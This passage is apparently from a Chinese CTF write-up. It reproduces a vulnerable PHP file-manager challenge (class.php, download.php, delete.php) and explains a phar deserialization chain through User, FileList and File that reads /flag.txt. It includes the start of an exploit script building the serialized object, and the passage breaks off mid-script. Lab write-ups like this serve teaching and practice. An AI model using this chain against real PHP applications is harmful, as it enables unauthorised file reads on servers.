string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>download.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>delete.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>先找找有没有什么敏感函数，File类中open方法有file_exists可以触发phar的反序列化，close方法有file_get_contents可以读内容。所有就根据这两处找找利用链。最开始想到就是User类中的析构函数调用了db属性的close方法，可以把db赋值为一个File类，调用同名函数。<br>但是这有个问题，读完了文件并没有回显的地方，所以这其实是个坑。再看看发现回显是在FileList中call方法给list赋值，然后destruct中打印。<br>运行这个生成phar文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     <span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token 